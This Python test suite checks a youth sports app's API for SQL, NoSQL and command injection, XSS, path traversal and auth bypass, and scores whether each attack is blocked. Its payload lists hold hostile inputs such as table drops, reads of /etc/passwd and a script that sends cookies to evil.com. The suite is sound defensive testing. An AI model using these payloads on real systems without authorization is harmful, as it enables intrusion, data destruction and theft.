#!/usr/bin/env python3
"""
Baby Goats Comprehensive Security Vulnerability Testing Suite
Tests specific security vulnerabilities that were flagged in previous testing:
- Input Sanitization & Validation Testing (SQL Injection)
- XSS (Cross-Site Scripting) Testing  
- NoSQL Injection Testing
- Command Injection Testing
- Path Traversal Testing

Focus: Identify and test security vulnerabilities with actual malicious payloads
Previous Result: 0/5 malicious payloads handled properly - CRITICAL SECURITY ISSUE
"""

import requests
import json
import uuid
from datetime import datetime
import time
import base64
import urllib.parse

# Configuration
BASE_URL = "https://youthgoat-social.preview.emergentagent.com/api"
HEADERS = {
    'Content-Type': 'application/json',
    'Accept': 'application/json'
}

# Test user IDs for security testing
TEST_USER_ID = str(uuid.uuid4())
TEST_PROFILE_ID = str(uuid.uuid4())

class SecurityVulnerabilityTester:
    def __init__(self):
        self.results = []
        self.vulnerabilities_found = []
        self.security_issues = []
        
    def log_result(self, test_name, success, details="", vulnerability_level="", response_data=None):
        """Log security test result"""
        result = {
            'test': test_name,
            'success': success,
            'details': details,
            'vulnerability_level': vulnerability_level,
            'timestamp': datetime.now().isoformat()
        }
        if response_data:
            result['response'] = response_data
        self.results.append(result)
        
        # Track vulnerabilities
        if not success and vulnerability_level in ['HIGH', 'CRITICAL']:
            self.vulnerabilities_found.append({
                'test': test_name,
                'level': vulnerability_level,
                'details': details,
                'timestamp': datetime.now().isoformat()
            })
        
        status = "✅ SECURE" if success else f"🚨 VULNERABLE ({vulnerability_level})"
        print(f"{status}: {test_name}")
        if details:
            print(f"   Details: {details}")
        if not success and response_data:
            print(f"   Response: {str(response_data)[:200]}...")
        print()

    def make_security_request(self, method, endpoint, data=None, params=None):
        """Make HTTP request for security testing"""
        url = f"{BASE_URL}{endpoint}"
        
        try:
            if method == 'GET':
                response = requests.get(url, headers=HEADERS, params=params, timeout=30)
            elif method == 'POST':
                response = requests.post(url, headers=HEADERS, json=data, timeout=30)
            elif method == 'PUT':
                response = requests.put(url, headers=HEADERS, json=data, timeout=30)
            elif method == 'DELETE':
                response = requests.delete(url, headers=HEADERS, params=params, timeout=30)
            else:
                raise ValueError(f"Unsupported method: {method}")
            
            return response
            
        except requests.exceptions.Timeout:
            print(f"Request timed out: {method} {url}")
            return None
        except requests.exceptions.ConnectionError:
            print(f"Connection error: {method} {url}")
            return None
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            return None

    def test_sql_injection_vulnerabilities(self):
        """Test SQL Injection attacks on API endpoints - CRITICAL PRIORITY"""
        print("🔍 Testing SQL Injection Vulnerabilities...")
        
        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE profiles; --",
            "' UNION SELECT * FROM profiles WHERE '1'='1",
            "admin'--",
            "' OR 1=1 LIMIT 1; --",
            "' OR 'x'='x",
            "1' OR '1'='1' /*",
            "'; INSERT INTO profiles VALUES ('hacked'); --"
        ]
        
        # Test endpoints vulnerable to SQL injection
        test_endpoints = [
            {
                'endpoint': '/profiles',
                'method': 'GET',
                'params': ['search', 'sport', 'full_name', 'grad_year'],
                'description': 'Profile search parameters'
            },
            {
                'endpoint': '/challenges',
                'method': 'GET', 
                'params': ['category', 'user_id'],
                'description': 'Challenge filtering parameters'
            },
            {
                'endpoint': '/storage',
                'method': 'GET',
                'params': ['fileName', 'userId'],
                'description': 'Storage query parameters'
            },
            {
                'endpoint': '/profiles',
                'method': 'POST',
                'data_fields': ['full_name', 'sport', 'location'],
                'description': 'Profile creation data'
            },
            {
                'endpoint': '/challenges',
                'method': 'POST',
                'data_fields': ['notes', 'user_id'],
                'description': 'Challenge completion data'
            }
        ]
        
        sql_injection_blocked = 0
        total_sql_tests = 0
        
        for endpoint_config in test_endpoints:
            endpoint = endpoint_config['endpoint']
            method = endpoint_config['method']
            description = endpoint_config['description']
            
            for payload in sql_payloads:
                total_sql_tests += 1
                
                if method == 'GET' and 'params' in endpoint_config:
                    # Test GET parameters
                    for param in endpoint_config['params']:
                        test_params = {param: payload}
                        
                        response = self.make_security_request(method, endpoint, params=test_params)
                        
                        # Check if SQL injection was blocked
                        sql_blocked = self.analyze_sql_injection_response(response, payload)
                        
                        if sql_blocked:
                            sql_injection_blocked += 1
                        
                        self.log_result(
                            f"SQL Injection - {method} {endpoint}?{param}={payload[:20]}...",
                            sql_blocked,
                            f"Payload: {payload}, Response: {response.status_code if response else 'No response'}, Blocked: {'Yes' if sql_blocked else 'No'}",
                            "CRITICAL" if not sql_blocked else "",
                            response.text[:100] if response else None
                        )
                
                elif method == 'POST' and 'data_fields' in endpoint_config:
                    # Test POST data fields
                    for field in endpoint_config['data_fields']:
                        test_data = {
                            'id': str(uuid.uuid4()),
                            field: payload
                        }
                        
                        # Add required fields based on endpoint
                        if endpoint == '/profiles':
                            test_data.update({
                                'full_name': 'Test User' if field != 'full_name' else payload,
                                'sport': 'Soccer' if field != 'sport' else payload,
                                'grad_year': 2025
                            })
                        elif endpoint == '/challenges':
                            test_data.update({
                                'user_id': TEST_USER_ID if field != 'user_id' else payload,
                                'challenge_id': str(uuid.uuid4())
                            })
                        
                        response = self.make_security_request(method, endpoint, data=test_data)
                        
                        # Check if SQL injection was blocked
                        sql_blocked = self.analyze_sql_injection_response(response, payload)
                        
                        if sql_blocked:
                            sql_injection_blocked += 1
                        
                        self.log_result(
                            f"SQL Injection - {method} {endpoint} field '{field}' = {payload[:20]}...",
                            sql_blocked,
                            f"Payload: {payload}, Response: {response.status_code if response else 'No response'}, Blocked: {'Yes' if sql_blocked else 'No'}",
                            "CRITICAL" if not sql_blocked else "",
                            response.text[:100] if response else None
                        )
        
        # Overall SQL injection assessment
        sql_protection_rate = (sql_injection_blocked / total_sql_tests * 100) if total_sql_tests > 0 else 0
        
        self.log_result(
            "SQL Injection Protection Overall Assessment",
            sql_protection_rate >= 90,
            f"SQL injection protection: {sql_injection_blocked}/{total_sql_tests} payloads blocked ({sql_protection_rate:.1f}%)",
            "CRITICAL" if sql_protection_rate < 50 else "HIGH" if sql_protection_rate < 90 else "",
            None
        )

    def analyze_sql_injection_response(self, response, payload):
        """Analyze response to determine if SQL injection was blocked"""
        if not response:
            return True  # No response could mean blocked
        
        # Check for SQL injection success indicators
        response_text = response.text.lower() if response.text else ""
        
        # Signs that SQL injection was NOT blocked (vulnerability exists)
        sql_success_indicators = [
            'syntax error',
            'mysql error',
            'postgresql error',
            'sqlite error',
            'sql error',
            'database error',
            'table doesn\'t exist',
            'column not found',
            'duplicate entry',
            'constraint violation'
        ]
        
        # Check if response indicates SQL injection worked
        for indicator in sql_success_indicators:
            if indicator in response_text:
                return False  # SQL injection NOT blocked - vulnerability found
        
        # Check for suspicious data exposure
        if response.status_code == 200 and len(response_text) > 1000:
            # Large response might indicate data dump from SQL injection
            if 'profiles' in response_text and 'password' in response_text:
                return False  # Possible data exposure
        
        # If we get here, SQL injection appears to be blocked
        return True

    def test_xss_vulnerabilities(self):
        """Test XSS (Cross-Site Scripting) vulnerabilities - HIGH PRIORITY"""
        print("🔍 Testing XSS Vulnerabilities...")
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "';alert('XSS');//",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "\"onmouseover=\"alert('XSS')\"",
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
        ]
        
        # Test text input fields for XSS
        xss_test_endpoints = [
            {
                'endpoint': '/profiles',
                'method': 'POST',
                'fields': ['full_name', 'location', 'bio'],
                'description': 'Profile text fields'
            },
            {
                'endpoint': '/challenges',
                'method': 'POST',
                'fields': ['notes', 'description'],
                'description': 'Challenge text fields'
            },
            {
                'endpoint': '/storage',
                'method': 'POST',
                'fields': ['fileName'],
                'description': 'Storage filename field'
            }
        ]
        
        xss_blocked = 0
        total_xss_tests = 0
        
        for endpoint_config in xss_test_endpoints:
            endpoint = endpoint_config['endpoint']
            method = endpoint_config['method']
            fields = endpoint_config.get('fields', [])
            
            for payload in xss_payloads:
                for field in fields:
                    total_xss_tests += 1
                    
                    # Create test data with XSS payload
                    test_data = {
                        'id': str(uuid.uuid4()),
                        field: payload
                    }
                    
                    # Add required fields
                    if endpoint == '/profiles':
                        test_data.update({
                            'full_name': 'XSS Test User' if field != 'full_name' else payload,
                            'sport': 'Soccer',
                            'grad_year': 2025
                        })
                    elif endpoint == '/challenges':
                        test_data.update({
                            'user_id': TEST_USER_ID,
                            'challenge_id': str(uuid.uuid4())
                        })
                    elif endpoint == '/storage':
                        test_data.update({
                            'action': 'upload',
                            'userId': TEST_USER_ID,
                            'fileName': payload if field == 'fileName' else 'test.jpg',
                            'fileData': 'dGVzdA==',  # base64 'test'
                            'contentType': 'image/jpeg'
                        })
                    
                    response = self.make_security_request(method, endpoint, data=test_data)
                    
                    # Check if XSS was sanitized
                    xss_sanitized = self.analyze_xss_response(response, payload)
                    
                    if xss_sanitized:
                        xss_blocked += 1
                    
                    self.log_result(
                        f"XSS - {method} {endpoint} field '{field}' = {payload[:30]}...",
                        xss_sanitized,
                        f"Payload: {payload[:50]}, Response: {response.status_code if response else 'No response'}, Sanitized: {'Yes' if xss_sanitized else 'No'}",
                        "HIGH" if not xss_sanitized else "",
                        response.text[:100] if response else None
                    )
        
        # Overall XSS protection assessment
        xss_protection_rate = (xss_blocked / total_xss_tests * 100) if total_xss_tests > 0 else 0
        
        self.log_result(
            "XSS Protection Overall Assessment",
            xss_protection_rate >= 90,
            f"XSS protection: {xss_blocked}/{total_xss_tests} payloads sanitized ({xss_protection_rate:.1f}%)",
            "HIGH" if xss_protection_rate < 50 else "MEDIUM" if xss_protection_rate < 90 else "",
            None
        )

    def analyze_xss_response(self, response, payload):
        """Analyze response to determine if XSS was sanitized"""
        if not response:
            return True  # No response could mean blocked
        
        response_text = response.text if response.text else ""
        
        # Check if the payload appears unsanitized in the response
        dangerous_patterns = [
            '<script',
            'javascript:',
            'onerror=',
            'onload=',
            'onmouseover=',
            'onfocus=',
            'alert(',
            'document.cookie'
        ]
        
        # If any dangerous pattern from payload appears in response, XSS not sanitized
        for pattern in dangerous_patterns:
            if pattern.lower() in payload.lower() and pattern.lower() in response_text.lower():
                return False  # XSS not sanitized - vulnerability found
        
        # Check if response contains the raw payload
        if payload in response_text:
            return False  # Raw payload returned - not sanitized
        
        # If we get here, XSS appears to be sanitized
        return True

    def test_nosql_injection_vulnerabilities(self):
        """Test NoSQL Injection vulnerabilities - HIGH PRIORITY"""
        print("🔍 Testing NoSQL Injection Vulnerabilities...")
        
        # NoSQL injection payloads
        nosql_payloads = [
            {"$ne": None},
            {"$regex": ".*"},
            {"$where": "function() { return true; }"},
            {"$gt": ""},
            {"$lt": ""},
            {"$in": ["admin", "user"]},
            {"$nin": []},
            {"$exists": True},
            {"$or": [{"username": "admin"}, {"username": "user"}]},
            {"$and": [{"$ne": None}]}
        ]
        
        # Convert payloads to JSON strings for testing
        nosql_string_payloads = [
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "function() { return true; }"}',
            '{"$gt": ""}',
            '{"$or": [{"id": "1"}, {"id": "2"}]}'
        ]
        
        nosql_blocked = 0
        total_nosql_tests = 0
        
        # Test NoSQL injection in query parameters
        nosql_endpoints = [
            '/profiles',
            '/challenges', 
            '/storage',
            '/stats'
        ]
        
        for endpoint in nosql_endpoints:
            for payload in nosql_string_payloads:
                total_nosql_tests += 1
                
                # Test as query parameter
                test_params = {'filter': payload}
                
                response = self.make_security_request('GET', endpoint, params=test_params)
                
                # Check if NoSQL injection was blocked
                nosql_blocked_result = self.analyze_nosql_injection_response(response, payload)
                
                if nosql_blocked_result:
                    nosql_blocked += 1
                
                self.log_result(
                    f"NoSQL Injection - GET {endpoint}?filter={payload[:30]}...",
                    nosql_blocked_result,
                    f"Payload: {payload}, Response: {response.status_code if response else 'No response'}, Blocked: {'Yes' if nosql_blocked_result else 'No'}",
                    "HIGH" if not nosql_blocked_result else "",
                    response.text[:100] if response else None
                )
        
        # Test NoSQL injection in POST data
        for payload in nosql_string_payloads:
            total_nosql_tests += 1
            
            test_data = {
                'id': str(uuid.uuid4()),
                'full_name': 'NoSQL Test User',
                'sport': payload,  # Inject NoSQL payload in sport field
                'grad_year': 2025
            }
            
            response = self.make_security_request('POST', '/profiles', data=test_data)
            
            nosql_blocked_result = self.analyze_nosql_injection_response(response, payload)
            
            if nosql_blocked_result:
                nosql_blocked += 1
            
            self.log_result(
                f"NoSQL Injection - POST /profiles sport field = {payload[:30]}...",
                nosql_blocked_result,
                f"Payload: {payload}, Response: {response.status_code if response else 'No response'}, Blocked: {'Yes' if nosql_blocked_result else 'No'}",
                "HIGH" if not nosql_blocked_result else "",
                response.text[:100] if response else None
            )
        
        # Overall NoSQL injection assessment
        nosql_protection_rate = (nosql_blocked / total_nosql_tests * 100) if total_nosql_tests > 0 else 0
        
        self.log_result(
            "NoSQL Injection Protection Overall Assessment",
            nosql_protection_rate >= 90,
            f"NoSQL injection protection: {nosql_blocked}/{total_nosql_tests} payloads blocked ({nosql_protection_rate:.1f}%)",
            "HIGH" if nosql_protection_rate < 50 else "MEDIUM" if nosql_protection_rate < 90 else "",
            None
        )

    def analyze_nosql_injection_response(self, response, payload):
        """Analyze response to determine if NoSQL injection was blocked"""
        if not response:
            return True  # No response could mean blocked
        
        response_text = response.text.lower() if response.text else ""
        
        # Signs that NoSQL injection was NOT blocked
        nosql_success_indicators = [
            'mongodb error',
            'mongoose error',
            'invalid query',
            'query error',
            'aggregation error',
            '$where',
            '$regex',
            '$ne',
            'bson'
        ]
        
        # Check if response indicates NoSQL injection worked
        for indicator in nosql_success_indicators:
            if indicator in response_text:
                return False  # NoSQL injection NOT blocked
        
        # Check for suspicious data exposure (large response with multiple records)
        if response.status_code == 200 and len(response_text) > 2000:
            try:
                data = response.json()
                if isinstance(data, dict) and 'profiles' in data:
                    profiles = data.get('profiles', [])
                    if len(profiles) > 10:  # Suspiciously large result set
                        return False  # Possible NoSQL injection success
            except:
                pass
        
        return True

    def test_command_injection_vulnerabilities(self):
        """Test Command Injection vulnerabilities - HIGH PRIORITY"""
        print("🔍 Testing Command Injection Vulnerabilities...")
        
        # Command injection payloads
        command_payloads = [
            "; ls -la",
            "| whoami",
            "&& echo vulnerable",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| ps aux",
            "&& pwd",
            "; uname -a",
            "$(ls -la)"
        ]
        
        command_blocked = 0
        total_command_tests = 0
        
        # Test command injection in file-related operations
        command_test_scenarios = [
            {
                'endpoint': '/storage',
                'method': 'POST',
                'field': 'fileName',
                'base_data': {
                    'action': 'upload',
                    'userId': TEST_USER_ID,
                    'fileData': 'dGVzdA==',
                    'contentType': 'image/jpeg'
                }
            },
            {
                'endpoint': '/profiles',
                'method': 'POST', 
                'field': 'location',
                'base_data': {
                    'id': str(uuid.uuid4()),
                    'full_name': 'Command Test User',
                    'sport': 'Soccer',
                    'grad_year': 2025
                }
            }
        ]
        
        for scenario in command_test_scenarios:
            endpoint = scenario['endpoint']
            method = scenario['method']
            field = scenario['field']
            base_data = scenario['base_data']
            
            for payload in command_payloads:
                total_command_tests += 1
                
                # Create test data with command injection payload
                test_data = base_data.copy()
                test_data[field] = f"normal_value{payload}"
                
                response = self.make_security_request(method, endpoint, data=test_data)
                
                # Check if command injection was blocked
                command_blocked_result = self.analyze_command_injection_response(response, payload)
                
                if command_blocked_result:
                    command_blocked += 1
                
                self.log_result(
                    f"Command Injection - {method} {endpoint} field '{field}' = normal_value{payload}",
                    command_blocked_result,
                    f"Payload: {payload}, Response: {response.status_code if response else 'No response'}, Blocked: {'Yes' if command_blocked_result else 'No'}",
                    "HIGH" if not command_blocked_result else "",
                    response.text[:100] if response else None
                )
        
        # Overall command injection assessment
        command_protection_rate = (command_blocked / total_command_tests * 100) if total_command_tests > 0 else 0
        
        self.log_result(
            "Command Injection Protection Overall Assessment",
            command_protection_rate >= 90,
            f"Command injection protection: {command_blocked}/{total_command_tests} payloads blocked ({command_protection_rate:.1f}%)",
            "HIGH" if command_protection_rate < 50 else "MEDIUM" if command_protection_rate < 90 else "",
            None
        )

    def analyze_command_injection_response(self, response, payload):
        """Analyze response to determine if command injection was blocked"""
        if not response:
            return True  # No response could mean blocked
        
        response_text = response.text if response.text else ""
        
        # Signs that command injection was NOT blocked (command executed)
        command_success_indicators = [
            'total ',  # from ls -la
            'uid=',    # from id/whoami
            'vulnerable',  # from echo vulnerable
            '/bin/',   # from ps aux
            'linux',   # from uname -a
            'root:',   # from cat /etc/passwd
            'www-data', # common web user
            'drwx',    # directory permissions from ls
            'proc'     # from ps aux
        ]
        
        # Check if response contains command execution output
        for indicator in command_success_indicators:
            if indicator.lower() in response_text.lower():
                return False  # Command injection NOT blocked
        
        # Check for error messages that might indicate command execution attempt
        error_indicators = [
            'command not found',
            'permission denied',
            'no such file',
            'syntax error near',
            'sh: ',
            'bash: '
        ]
        
        for indicator in error_indicators:
            if indicator.lower() in response_text.lower():
                return False  # Command injection attempted but failed - still a vulnerability
        
        return True

    def test_path_traversal_vulnerabilities(self):
        """Test Path Traversal vulnerabilities - HIGH PRIORITY"""
        print("🔍 Testing Path Traversal Vulnerabilities...")
        
        # Path traversal payloads
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoded
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
            "../../../var/log/apache2/access.log",
            "..\\..\\..\\windows\\system32\\config\\system",
            "/etc/passwd",
            "\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        path_blocked = 0
        total_path_tests = 0
        
        # Test path traversal in file operations
        for payload in path_payloads:
            total_path_tests += 1
            
            # Test in storage fileName parameter
            test_data = {
                'action': 'upload',
                'userId': TEST_USER_ID,
                'fileName': payload,
                'fileData': 'dGVzdA==',
                'contentType': 'image/jpeg'
            }
            
            response = self.make_security_request('POST', '/storage', data=test_data)
            
            # Check if path traversal was blocked
            path_blocked_result = self.analyze_path_traversal_response(response, payload)
            
            if path_blocked_result:
                path_blocked += 1
            
            self.log_result(
                f"Path Traversal - POST /storage fileName = {payload}",
                path_blocked_result,
                f"Payload: {payload}, Response: {response.status_code if response else 'No response'}, Blocked: {'Yes' if path_blocked_result else 'No'}",
                "HIGH" if not path_blocked_result else "",
                response.text[:100] if response else None
            )
        
        # Test path traversal in GET parameters
        for payload in path_payloads[:5]:  # Test subset for GET requests
            total_path_tests += 1
            
            test_params = {'file': payload}
            
            response = self.make_security_request('GET', '/storage', params=test_params)
            
            path_blocked_result = self.analyze_path_traversal_response(response, payload)
            
            if path_blocked_result:
                path_blocked += 1
            
            self.log_result(
                f"Path Traversal - GET /storage?file={payload}",
                path_blocked_result,
                f"Payload: {payload}, Response: {response.status_code if response else 'No response'}, Blocked: {'Yes' if path_blocked_result else 'No'}",
                "HIGH" if not path_blocked_result else "",
                response.text[:100] if response else None
            )
        
        # Overall path traversal assessment
        path_protection_rate = (path_blocked / total_path_tests * 100) if total_path_tests > 0 else 0
        
        self.log_result(
            "Path Traversal Protection Overall Assessment",
            path_protection_rate >= 90,
            f"Path traversal protection: {path_blocked}/{total_path_tests} payloads blocked ({path_protection_rate:.1f}%)",
            "HIGH" if path_protection_rate < 50 else "MEDIUM" if path_protection_rate < 90 else "",
            None
        )

    def analyze_path_traversal_response(self, response, payload):
        """Analyze response to determine if path traversal was blocked"""
        if not response:
            return True  # No response could mean blocked
        
        response_text = response.text if response.text else ""
        
        # Signs that path traversal was NOT blocked (file contents exposed)
        path_success_indicators = [
            'root:x:0:0:',  # /etc/passwd content
            '# localhost',  # hosts file content
            'windows registry',  # Windows system files
            '[boot loader]',  # Windows boot.ini
            'apache',  # log files
            'www-data',  # system users
            'daemon:',  # system users
            'bin:',  # system users
        ]
        
        # Check if response contains sensitive file contents
        for indicator in path_success_indicators:
            if indicator.lower() in response_text.lower():
                return False  # Path traversal NOT blocked
        
        # Check for file system error messages that indicate traversal attempt
        traversal_error_indicators = [
            'no such file or directory',
            'access denied',
            'permission denied',
            'file not found',
            'invalid path',
            'path traversal'
        ]
        
        # If we get specific file system errors, it might indicate the traversal was attempted
        for indicator in traversal_error_indicators:
            if indicator.lower() in response_text.lower():
                # This is actually good - the system recognized and blocked the traversal
                return True
        
        # Check if the payload appears sanitized in any error message
        if '..' in payload and '..' not in response_text:
            return True  # Path traversal characters were sanitized
        
        return True

    def test_authentication_bypass_attempts(self):
        """Test Authentication Bypass vulnerabilities - CRITICAL PRIORITY"""
        print("🔍 Testing Authentication Bypass Vulnerabilities...")
        
        # Authentication bypass payloads
        auth_bypass_payloads = [
            {'Authorization': 'Bearer fake_token'},
            {'Authorization': 'Bearer null'},
            {'Authorization': 'Bearer undefined'},
            {'Authorization': 'Bearer admin'},
            {'Authorization': 'Bearer ' + 'A' * 1000},  # Long token
            {'X-User-ID': 'admin'},
            {'X-Admin': 'true'},
            {'X-Role': 'administrator'}
        ]
        
        auth_protected = 0
        total_auth_tests = 0
        
        # Test protected endpoints
        protected_endpoints = [
            {'endpoint': '/profiles', 'method': 'POST'},
            {'endpoint': '/challenges', 'method': 'POST'},
            {'endpoint': '/storage', 'method': 'POST'},
            {'endpoint': '/stats', 'method': 'POST'}
        ]
        
        for endpoint_config in protected_endpoints:
            endpoint = endpoint_config['endpoint']
            method = endpoint_config['method']
            
            for bypass_headers in auth_bypass_payloads:
                total_auth_tests += 1
                
                # Create test data
                test_data = {
                    'id': str(uuid.uuid4()),
                    'test': 'auth_bypass_attempt'
                }
                
                if endpoint == '/profiles':
                    test_data.update({
                        'full_name': 'Auth Bypass Test',
                        'sport': 'Soccer',
                        'grad_year': 2025
                    })
                elif endpoint == '/storage':
                    test_data.update({
                        'action': 'upload',
                        'userId': TEST_USER_ID,
                        'fileName': 'test.jpg',
                        'fileData': 'dGVzdA==',
                        'contentType': 'image/jpeg'
                    })
                
                # Make request with bypass headers
                headers = {**HEADERS, **bypass_headers}
                
                try:
                    if method == 'POST':
                        response = requests.post(f"{BASE_URL}{endpoint}", headers=headers, json=test_data, timeout=30)
                    else:
                        response = requests.get(f"{BASE_URL}{endpoint}", headers=headers, timeout=30)
                except:
                    response = None
                
                # Check if authentication was properly enforced
                auth_enforced = self.analyze_auth_bypass_response(response)
                
                if auth_enforced:
                    auth_protected += 1
                
                self.log_result(
                    f"Auth Bypass - {method} {endpoint} with {list(bypass_headers.keys())[0]}",
                    auth_enforced,
                    f"Headers: {bypass_headers}, Response: {response.status_code if response else 'No response'}, Auth Enforced: {'Yes' if auth_enforced else 'No'}",
                    "CRITICAL" if not auth_enforced else "",
                    response.text[:100] if response else None
                )
        
        # Overall authentication protection assessment
        auth_protection_rate = (auth_protected / total_auth_tests * 100) if total_auth_tests > 0 else 0
        
        self.log_result(
            "Authentication Protection Overall Assessment",
            auth_protection_rate >= 90,
            f"Authentication protection: {auth_protected}/{total_auth_tests} bypass attempts blocked ({auth_protection_rate:.1f}%)",
            "CRITICAL" if auth_protection_rate < 50 else "HIGH" if auth_protection_rate < 90 else "",
            None
        )

    def analyze_auth_bypass_response(self, response):
        """Analyze response to determine if authentication was properly enforced"""
        if not response:
            return True  # No response could mean blocked
        
        # Check if request was successful (authentication bypassed)
        if response.status_code in [200, 201]:
            # Check if response contains actual data (successful operation)
            try:
                data = response.json()
                if isinstance(data, dict) and ('success' in data or 'id' in data or 'profiles' in data):
                    return False  # Authentication was bypassed
            except:
                pass
        
        # Check for authentication error responses
        auth_error_codes = [401, 403]
        if response.status_code in auth_error_codes:
            return True  # Authentication properly enforced
        
        # Check for authentication error messages
        response_text = response.text.lower() if response.text else ""
        auth_error_messages = [
            'unauthorized',
            'forbidden',
            'access denied',
            'authentication required',
            'invalid token',
            'missing authorization'
        ]
        
        for error_msg in auth_error_messages:
            if error_msg in response_text:
                return True  # Authentication properly enforced
        
        # If we get here and status is not success, assume auth is working
        return response.status_code not in [200, 201]

    def run_comprehensive_security_tests(self):
        """Run complete security vulnerability testing suite"""
        print(f"🔒 Starting Baby Goats Comprehensive Security Vulnerability Testing Suite")
        print(f"📍 Backend API URL: {BASE_URL}")
        print(f"🎯 Focus: Security Vulnerability Assessment")
        print(f"🚨 Previous Result: 0/5 malicious payloads handled properly - CRITICAL SECURITY ISSUE")
        print(f"🔍 Testing: SQL Injection, XSS, NoSQL Injection, Command Injection, Path Traversal, Auth Bypass")
        print(f"🕐 Started at: {datetime.now().isoformat()}")
        print("=" * 80)
        
        try:
            # CRITICAL PRIORITY TESTS - Security Vulnerabilities
            print("\n🚨 CRITICAL PRIORITY TESTS - Security Vulnerability Assessment")
            print("-" * 60)
            
            # Test SQL Injection Vulnerabilities
            self.test_sql_injection_vulnerabilities()
            
            # Test XSS Vulnerabilities
            self.test_xss_vulnerabilities()
            
            # Test NoSQL Injection Vulnerabilities
            self.test_nosql_injection_vulnerabilities()
            
            # Test Command Injection Vulnerabilities
            self.test_command_injection_vulnerabilities()
            
            # Test Path Traversal Vulnerabilities
            self.test_path_traversal_vulnerabilities()
            
            # Test Authentication Bypass Attempts
            self.test_authentication_bypass_attempts()
            
        except Exception as e:
            print(f"❌ Security test suite failed with error: {e}")
            self.log_result("Security Vulnerability Test Suite Execution", False, str(e), "CRITICAL")
        
        # Print summary
        self.print_security_summary()

    def print_security_summary(self):
        """Print comprehensive security test results summary"""
        print("=" * 80)
        print("🔒 COMPREHENSIVE SECURITY VULNERABILITY TEST RESULTS SUMMARY")
        print("=" * 80)
        
        total_tests = len(self.results)
        secure_tests = len([r for r in self.results if r['success']])
        vulnerable_tests = total_tests - secure_tests
        
        print(f"Total Security Tests: {total_tests}")
        print(f"🔒 Secure: {secure_tests}")
        print(f"🚨 Vulnerable: {vulnerable_tests}")
        print(f"Security Rate: {(secure_tests/total_tests*100):.1f}%" if total_tests > 0 else "0%")
        
        # Vulnerability breakdown by type
        vulnerability_types = {}
        for result in self.results:
            if not result['success']:
                test_type = result['test'].split(' - ')[0] if ' - ' in result['test'] else 'Other'
                if test_type not in vulnerability_types:
                    vulnerability_types[test_type] = 0
                vulnerability_types[test_type] += 1
        
        if vulnerability_types:
            print(f"\n🚨 VULNERABILITIES FOUND BY TYPE:")
            for vuln_type, count in vulnerability_types.items():
                print(f"   {vuln_type}: {count} vulnerabilities")
        
        # Critical vulnerabilities
        critical_vulns = [r for r in self.results if not r['success'] and r.get('vulnerability_level') == 'CRITICAL']
        high_vulns = [r for r in self.results if not r['success'] and r.get('vulnerability_level') == 'HIGH']
        
        print(f"\n🔥 CRITICAL VULNERABILITIES: {len(critical_vulns)}")
        for vuln in critical_vulns:
            print(f"   ❌ {vuln['test']}")
            print(f"      Details: {vuln['details']}")
        
        print(f"\n⚠️ HIGH VULNERABILITIES: {len(high_vulns)}")
        for vuln in high_vulns:
            print(f"   ❌ {vuln['test']}")
            print(f"      Details: {vuln['details']}")
        
        # Security assessment by category
        sql_tests = [r for r in self.results if 'SQL Injection' in r['test']]
        sql_secure = len([r for r in sql_tests if r['success']])
        
        xss_tests = [r for r in self.results if 'XSS' in r['test']]
        xss_secure = len([r for r in xss_tests if r['success']])
        
        nosql_tests = [r for r in self.results if 'NoSQL Injection' in r['test']]
        nosql_secure = len([r for r in nosql_tests if r['success']])
        
        command_tests = [r for r in self.results if 'Command Injection' in r['test']]
        command_secure = len([r for r in command_tests if r['success']])
        
        path_tests = [r for r in self.results if 'Path Traversal' in r['test']]
        path_secure = len([r for r in path_tests if r['success']])
        
        auth_tests = [r for r in self.results if 'Auth Bypass' in r['test']]
        auth_secure = len([r for r in auth_tests if r['success']])
        
        print(f"\n📊 SECURITY ASSESSMENT BY CATEGORY:")
        if sql_tests:
            print(f"   🛡️ SQL Injection Protection: {sql_secure}/{len(sql_tests)} ({sql_secure/len(sql_tests)*100:.1f}%)")
        if xss_tests:
            print(f"   🛡️ XSS Protection: {xss_secure}/{len(xss_tests)} ({xss_secure/len(xss_tests)*100:.1f}%)")
        if nosql_tests:
            print(f"   🛡️ NoSQL Injection Protection: {nosql_secure}/{len(nosql_tests)} ({nosql_secure/len(nosql_tests)*100:.1f}%)")
        if command_tests:
            print(f"   🛡️ Command Injection Protection: {command_secure}/{len(command_tests)} ({command_secure/len(command_tests)*100:.1f}%)")
        if path_tests:
            print(f"   🛡️ Path Traversal Protection: {path_secure}/{len(path_tests)} ({path_secure/len(path_tests)*100:.1f}%)")
        if auth_tests:
            print(f"   🛡️ Authentication Protection: {auth_secure}/{len(auth_tests)} ({auth_secure/len(auth_tests)*100:.1f}%)")
        
        # Overall security assessment
        print(f"\n🏆 OVERALL SECURITY ASSESSMENT:")
        
        security_rate = (secure_tests/total_tests*100) if total_tests > 0 else 0
        
        if security_rate >= 90:
            print("   🎉 EXCELLENT SECURITY - Application has strong security controls!")
            print("   ✅ Most malicious payloads are properly handled")
            print("   ✅ Input sanitization and validation working effectively")
            print("   ✅ Authentication and authorization properly enforced")
            print("   🚀 READY FOR PRODUCTION DEPLOYMENT!")
        elif security_rate >= 70:
            print("   ⚠️ GOOD SECURITY - Application has decent security but needs improvement")
            print("   ✅ Many security controls are working")
            print("   ⚠️ Some vulnerabilities need to be addressed")
            print("   🔧 SECURITY IMPROVEMENTS RECOMMENDED BEFORE PRODUCTION")
        elif security_rate >= 50:
            print("   🚨 MODERATE SECURITY RISK - Application has significant security issues")
            print("   ⚠️ Multiple vulnerabilities detected")
            print("   🚨 Input sanitization needs major improvements")
